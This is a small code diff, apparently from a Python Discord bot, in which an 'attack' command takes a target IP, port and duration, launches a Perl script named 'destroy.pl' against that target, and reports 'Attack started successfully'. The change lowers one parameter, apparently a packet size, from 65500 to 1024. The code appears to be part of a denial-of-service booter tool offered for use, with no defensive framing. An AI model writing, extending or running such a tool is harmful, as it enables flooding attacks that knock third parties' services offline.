@@ -60,7 +60,7 @@ async def attack(ctx, command: str, ip: str, port: int, time: int):
         # Ejecutar el script Perl
         attack_process = subprocess.Popen([
             "perl", "destroy.pl",
-            ip, str(port), "65500", str(time)
+            ip, str(port), "1024", str(time)
         ])
 
         await ctx.send(f"Attack started successfully\nTarget: `{ip}:{port}`\nTime: `{time}` seconds")
